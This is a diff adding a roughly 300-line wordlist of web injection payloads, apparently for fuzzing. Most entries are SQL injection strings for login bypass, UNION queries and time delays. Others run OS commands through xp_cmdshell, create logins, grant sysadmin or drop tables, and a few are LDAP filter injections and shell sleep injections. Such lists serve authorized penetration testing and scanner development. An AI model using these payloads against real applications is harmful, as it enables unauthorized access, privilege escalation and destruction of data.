@@ -1,0 +1,296 @@
+﻿!
+" "
+" #
+" --
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+" or "1"="1
+" or "1"="1"#
+" or "1"="1"--
+" or "1"="1"/*
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 0=0 –
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or 1=1–
+" or true--
+"&"
+") or "1"="1
+") or "1"="1"#
+") or "1"="1"--
+") or "1"="1"/*
+") or ("1"="1
+") or ("1"="1"#
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("a"="a
+") or ("x")=("x
+") or true--
+")) or (("x"))=(("x
+"*"
+"-"
+"/*
+"a"" or 1=1--"
+"a"" or 3=3--"
+"hi"") or (""a""=""a"
+"or 1=1 or ""="
+"^"
+%' or '0'='0
+%20$(sleep%2050)
+%20'sleep%2050'
+%20or%20x=x
+%21
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+'%20OR
+<>"'%;)(&+
+'
+' #
+' '
+' (select top 1
+' --
+' ; drop table temp --
+' and 'one'='one
+' and 'one'='one–
+' and 1='1
+' and a='a
+' and substring(password/text(),1,1)='7
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' grant connect to name; grant resource to name; --
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/*
+' or '1′='1
+' or 'a'='a
+' or 'one'='one
+' or 'one'='one–
+' or 'x'='x
+' OR 'x'='x'#;
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+' or 1 --'
+' or 1=1
+' or 1=1 --
+' or 1=1 LIMIT 1;#
+' or 1=1 or ''='
+' or 1=1 –
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or 1=1;#
+' or 1=1–
+' or 3=3
+' or a=a--
+' or a=a–
+' or true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' –
+'#
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'&'
+') or '1'='1
+') or '1'='1'#
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1--
+') or ('1'='1
+') or ('1'='1'#
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1--
+') or ('a'='a
+') or ('a'='a and hi") or ("a"="a
+') or ('x')=('x
+') or ('x'='x
+') or true--
+')%20or%20('x'='x
+')) or (('x'))=(('x
+'*'
+'-'
+'--
+'/*
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+'=' 'or' and '=' 'or'
+'exec sp_addlogin 'name' , 'password' --
+'hi' or 'x'='x';
+'or 1=1 or ''='
+'or'1=1
+'or'1=1′
+'sqlattempt1
+'^'
+'||UTL_HTTP.REQUEST
+(
+(sqlattempt2)
+)
+) or '1′='1–
+) or ('1′='1–
+) or (a=a
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+,@variable
+--sp_password
+/
+//
+//*
+0 or 1=1
+1 and 1=1
+1 exec sp_ (or exec xp_)
+1 or 1=1
+1 waitfor delay '0:0:10'--
+1' and 1=(select count(*) from tablenames); --
+1' or '1'='1
+1'1
+1;SELECT%20*
+1′) and '1′='1–
+23 OR 1=1
+=
+==
+?
+@variable
+a'
+a' or 'a' = 'a
+a' or 1=1--
+a' or 3=3--
+a' waitfor delay '0:0:10'--
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' and substring(password/text(),1,1)='7
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'/*
+admin'or 1=1 or ''='
+and 1=1
+and 1=1–
+anything' OR 'x'='x
+as
+asc
+bfilename
+char%4039%41%2b%40SELECT
+delete
+desc
+distinct
+exec sp
+exec xp
+handler
+having
+hi or 1=1 --"
+hi or a=a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+insert
+like
+like '%'
+limit
+or
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+or 0=0 –
+or 1=1
+or 1=1 or ""=
+or 1=1#
+or 1=1--
+or 1=1/*
+or 1=1–
+or 3=3 --
+or a = a
+or a=a
+or true
+or true--
+or%201=1
+or%201=1 --
+order by
+PRINT
+PRINT @@variable
+procedure
+replace
+select
+to_timestamp_tz
+truncate
+tz_offset
+update
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+\x27UNION SELECT
+|
